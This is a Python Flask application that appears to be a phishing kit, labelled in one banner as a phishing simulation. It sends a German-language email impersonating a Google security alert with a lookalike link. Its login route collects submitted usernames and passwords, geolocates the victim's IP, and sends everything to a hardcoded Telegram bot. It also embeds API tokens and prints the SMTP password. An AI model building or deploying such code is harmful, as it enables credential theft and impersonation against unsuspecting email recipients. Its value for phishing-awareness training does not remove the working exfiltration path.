from flask import Flask, render_template, request, redirect
from flask_basicauth import BasicAuth
import requests
import smtplib
import json
import os
from dotenv import load_dotenv

load_dotenv('.env')

password = os.environ.get('password')

app = Flask(__name__)
app.static_folder = 'static'
app.static_url_path = '/static'

app.config['BASIC_AUTH_USERNAME'] = 'demo'
app.config['BASIC_AUTH_PASSWORD'] = 'demo'

basic_auth = BasicAuth(app)


@app.route('/')
@basic_auth.required
def index():
    return render_template('index.html')


@app.route('/email')
@basic_auth.required
def email():
    return render_template('email.html')


@app.route('/send', methods=['POST'])
def send_email():
    adress = request.form['email']
    key = request.form['key']
    if key != password and not '@goog.re' in adress:
        return 'Key wrong'
    htmlmessage = """
<!DOCTYPE html>
<html lang="en">

<head>
    <meta name="format-detection" content="email=no" />
    <meta name="format-detection" content="date=no" />
    <style nonce="EEsuYniP2Zewixz8iO6Qrg">
        .awl a {
            color: #FFFFFF;
            text-decoration: none;
        }

        .abml a {
            color: #000000;
            font-family: Roboto-Medium, Helvetica, Arial, sans-serif;
            font-weight: bold;
            text-decoration: none;
        }

        .adgl a {
            color: rgba(0, 0, 0, 0.87);
            text-decoration: none;
        }

        .afal a {
            color: #b0b0b0;
            text-decoration: none;
        }

        @media screen and (min-width: 600px) {
            .v2sp {
                padding: 6px 30px 0px;
            }

            .v2rsp {
                padding: 0px 10px;
            }
        }

        @media screen and (min-width: 600px) {
            .mdv2rw {
                padding: 40px 40px;
            }
        }
    </style>
    <link href="//fonts.googleapis.com/css?family=Google+Sans" rel="stylesheet" type="text/css"
        nonce="EEsuYniP2Zewixz8iO6Qrg" />
    <style type="text/css">
        h4 {
            text-align: left;
        }

        @media screen {

            .headerLineTitle {
                width: 1.5in;
                display: inline-block;
                margin: 0in;
                margin-bottom: .0001pt;
                font-size: 11.0pt;
                font-family: "Calibri", "sans-serif";
                font-weight: bold;
            }

            .headerLineText {
                display: inline;
                margin: 0in;
                margin-bottom: .0001pt;
                font-size: 11.0pt;
                font-family: "Calibri", "sans-serif";
                font-weight: normal;
            }

            .pageHeader {
                font-size: 14.0pt;
                font-family: "Calibri", "sans-serif";
                font-weight: bold;
                visibility: hidden;
                display: none;
            }
        }

        @media print {
            .headerLineTitle {
                width: 1.5in;
                display: inline-block;
                margin: 0in;
                margin-bottom: .0001pt;
                font-size: 11.0pt;
                font-family: "Calibri", "sans-serif";
                font-weight: bold;
            }

            .headerLineText {
                display: inline;
                margin: 0in;
                margin-bottom: .0001pt;
                font-size: 11.0pt;
                font-family: "Calibri", "sans-serif";
                font-weight: normal;
            }

            .pageHeader {
                font-size: 14.0pt;
                font-family: "Calibri", "sans-serif";
                font-weight: bold;
                visibility: visible;
                display: block;
            }

        }
    </style>
</head>

<body style="margin: 0; padding: 0;" bgcolor="#FFFFFF">
    <table width="100%" height="100%" style="min-width: 348px;" border="0" cellspacing="0" cellpadding="0" lang="en">
        <tr height="32" style="height: 32px;">
            <td></td>
        </tr>
                                        <p style="color:red;margin-left:auto;margin-right:auto;">This website is used for simulating phishing attacks. Please do not enter any personal data as it could be stored insecurely.</p>

        <tr align="center">
            <td>
                <div itemscope itemtype="//schema.org/EmailMessage">
                    <div itemprop="action" itemscope itemtype="//schema.org/ViewAction">
                        <link itemprop="url"
                            href="login-clone.vercel.app" />
                        <meta itemprop="name" content="Aktivität überprüfen" />
                    </div>
                </div>
                <table border="0" cellspacing="0" cellpadding="0"
                    style="padding-bottom: 20px; max-width: 516px; min-width: 220px;">
                    <tr>
                        <td width="8" style="width: 8px;"></td>
                        <td>
                            <div style="border-style: solid; border-width: thin; border-color:#dadce0; border-radius: 8px; padding: 40px 20px;"
                                align="center" class="mdv2rw"><img
                                    src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png"
                                    width="74" height="24" aria-hidden="true" style="margin-bottom: 16px;" alt="Google">
                                <div
                                    style="font-family: &#39;Google Sans&#39;,Roboto,RobotoDraft,Helvetica,Arial,sans-serif;border-bottom: thin solid #dadce0; color: rgba(0,0,0,0.87); line-height: 32px; padding-bottom: 24px;text-align: center; word-break: break-word;">
                                    <div style="font-size: 24px;">Kritische Sicherheitswarnung </div>
                                    <table align="center" style="margin-top:8px;">
                                        <tr style="line-height: normal;">
                                            <td align="right" style="padding-right:8px;"><img width="20" height="20"
                                                    style="width: 20px; height: 20px; vertical-align: sub; border-radius: 50%;;"
                                                    src="https://lh3.googleusercontent.com/a/ALm5wu1c8vpryghTuxkedMNAIt57LBZWhW8CraaqPuag=s96"
                                                    alt=""></td>
                                            <td><a
                                                    style="font-family: &#39;Google Sans&#39;,Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color: rgba(0,0,0,0.87); font-size: 14px; line-height: 20px;">"""+adress+"""</a>
                                            </td>
                                        </tr>
                                    </table>
                                </div>
                                <div
                                    style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif; font-size: 14px; color: rgba(0,0,0,0.87); line-height: 20px;padding-top: 20px; text-align: center;">
                                    Wir haben festgestellt, dass sich jemand auf einem Linux-Gerät in Ihrem Google-Konto
                                    angemeldet hat. Falls Sie das waren, müssen Sie nichts weiter unternehmen.
                                    Andernfalls unterstützen wir Sie gern dabei, die Sicherheit Ihres Kontos zu
                                    verbessern.<div style="padding-top: 32px; text-align: center;"><a
                                            href="https://account.goog.re/"
                                            target="_blank" link-id="main-button-link"
                                            style="font-family: &#39;Google Sans&#39;,Roboto,RobotoDraft,Helvetica,Arial,sans-serif; line-height: 16px; color: #ffffff; font-weight: 400; text-decoration: none;font-size: 14px;display:inline-block;padding: 10px 24px;background-color: #4184F3; border-radius: 5px; min-width: 90px;">Aktivität
                                            prüfen</a></div>
                                </div>
                                <div
                                    style="padding-top: 20px; font-size: 12px; line-height: 16px; color: #5f6368; letter-spacing: 0.3px; text-align: center">
                                    Sie können sich sicherheitsrelevante Aktivitäten auch hier ansehen: <br><a
                                        style="color: rgba(0, 0, 0, 0.87);text-decoration: inherit;">https://myaccount.google.com/notifications</a>
                                </div>
                            </div>
                            <div style="text-align: left;">
                                <div
                                    style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif;color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">
                                    <div>Wir haben Ihnen diese E-Mail gesendet, um Sie über wichtige Änderungen zu Ihrem
                                        Google-Konto und den Diensten von Google zu informieren.</div>
                                    <div style="direction: ltr;">&copy; 2023 Google Ireland Ltd., <a class="afal"
                                            style="font-family: Roboto-Regular,Helvetica,Arial,sans-serif;color: rgba(0,0,0,0.54); font-size: 11px; line-height: 18px; padding-top: 12px; text-align: center;">123 Rickroll Road ,Springfield, NY 12345 ,USA</a></div>
                                </div>
                            </div>
                        </td>
                        <td width="8" style="width: 8px;"></td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr height="32" style="height: 32px;">
            <td></td>
        </tr>
        
    </table>
</body>

</html>
    """
    print(password)
    try:
        server = smtplib.SMTP('smtp.mail.ch', 587)
        server.starttls()
        headers = "\r\n".join(["from: " + "Support" + " <" + "no-scam-login@mail.ch" + ">",
                               "subject: Wichtige Mitteilung bezueglich Ihres Kontos",
                               "to: " + adress,
                               "mime-version: 1.0",
                               "content-type: text/html"])
        server.login('no-scam-login@mail.ch', password)
        message = headers.encode('utf-8') + b"\r\n\r\n" + \
            htmlmessage.encode('utf-8')
        server.sendmail('no-scam-login@mail.ch', adress, message)
        server.quit()
        return 'Email sent successfully!'
    except Exception as e:
        return 'Something went wrong: ' + str(e)


@app.route('/pass')
@basic_auth.required
def passwd():

    user = request.args.get('email')
    if not user.endswith('@gmail.com'):
        user = user + "@gmail.com"
    print(user)
    return render_template('passwd.html', user=user)


@app.route('/login')
@basic_auth.required
def login():
    username = request.args.get('username')
    password = request.args.get('password')
    ip = request.remote_addr
    # IP-Daten von ip-api.com abrufen
    response = requests.get(f"https://ipfinder.ch/api?ip=${ip}&key=bot7UQcUaUfkqIRUPx4G")
    print(response.json())
    ip_data = (response.json())
    # Nachricht an Telegram senden
    message = f"Login-Informationen:\nBenutzername: {username}\nPasswort: {password}\nIP: {ip}\nStandort: {ip_data['location']['lon']}, {ip_data['location']['lat']} ({ip_data['location']['city']}, {ip_data['location']['name']})\nAnbieter: {ip_data['as']['name']} {ip_data['as']['domain']}"
    requests.get(f"https://api.telegram.org/bot5751384094:AAGiPu72GJlp4JziOkQvnpMtIH2EZsF1JmQ/sendMessage?chat_id=608885714&disable_web_page_preview=true&disable_web_page_preview=true&text={message}")
    return redirect("https://myaccount.google.com/")


#--------------------------RUN app--------------------------#
if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5500) 
